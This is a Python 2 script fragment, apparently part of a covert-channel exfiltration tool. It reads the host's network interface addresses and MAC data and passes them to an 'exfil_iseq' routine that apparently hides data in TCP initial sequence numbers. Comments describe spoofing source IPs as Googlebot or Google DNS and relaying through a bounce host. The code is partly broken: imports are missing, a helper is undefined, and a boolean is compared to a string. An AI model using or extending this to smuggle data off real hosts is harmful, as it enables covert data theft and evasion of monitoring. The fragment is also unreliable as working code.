
from lib import initialSeqFerret

# When using a bounce host, the bounce host will be the destination,
# the source host will be our server.
bounce = ''
# Spoof our source
#-spoof = '66.249.66.1'  # crawl-66-249-66-1.googlebot.com
#spoof = '8.8.8.8'     # google-public-dns-a.google.com
# Get our real ip. This is especially useful in NAT'd environments.
interfaces = netifaces.interfaces()

# This function sends interface details for interfaces of interest, AF_INET
# family. This function currently uses the initial sequence number.
def send_iface():
    print '[*] interfaces: %s' % interfaces
    # Interesting in sending found en*, eth*, and wlp* interface data
    for face in interfaces:
        addrs = netifaces.ifaddresses(face)
        # Get the MAC address
        facemac = addrs[netifaces.AF_LINK]
        try:
            print face, netifaces.ifaddresses(face)[2], facemac
            # Try to display en*
            if 'en' in face or 'eth' in face or 'wlp' in face:
                print '[*] found: %s' % face
                message = str(netifaces.ifaddresses(face)[2])
                # debugging
                print '[*] New message: %s' % message
                # trimmed = trim_message(message)
                # print '[*] Trimmed message: %s' % trimmed
                convert_message(message)
                # Call the testing method we'd like to test
                # TODO: run all tests or run a specific test, specify here.
                initialSeqFerret.exfil_iseq()
        except:
            # skip, do nothing
            print "[-] interface does not contain AF_INET family."

# I think single quotes are killing things
def trim_message(message):
    print '[*] trimming message'
    trimmed = []
    # Check for a valid char
    for char in message:
        # valid = re.match('^[\w-]+$', char) is not None
        invalid = re.match('^\'', char) is not None
        print '[*] invalid: %s is %s' % (char, invalid)
        # Add valid chars to trimmed
        if invalid == 'True':
            print '[*] skipping %s' % char
        else:
            trimmed.append(char)
    return trimmed
